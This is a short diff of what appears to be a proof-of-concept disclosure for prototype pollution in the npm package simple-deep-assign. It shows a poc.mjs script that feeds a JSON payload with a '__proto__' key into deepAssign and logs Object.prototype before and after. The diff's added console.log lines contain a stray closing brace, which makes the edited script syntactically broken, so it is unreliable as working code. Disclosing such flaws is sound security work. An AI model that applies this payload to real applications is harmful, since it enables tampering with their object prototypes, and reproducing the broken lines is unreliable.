@@ -9,9 +9,9 @@
 // poc.mjs
 import deepAssign from 'simple-deep-assign';
 
-console.log(`Before: ${{}.polluted}`)
+console.log('Before: ', {}.polluted})
 deepAssign({}, JSON.parse('{"__proto__": {"polluted": "Prototype Polluted"}}'));
-console.log(`After: ${{}.polluted}`)
+console.log('After: ', {}.polluted})
 ```
 2. Execute the following commands in the terminal:
 ```bash
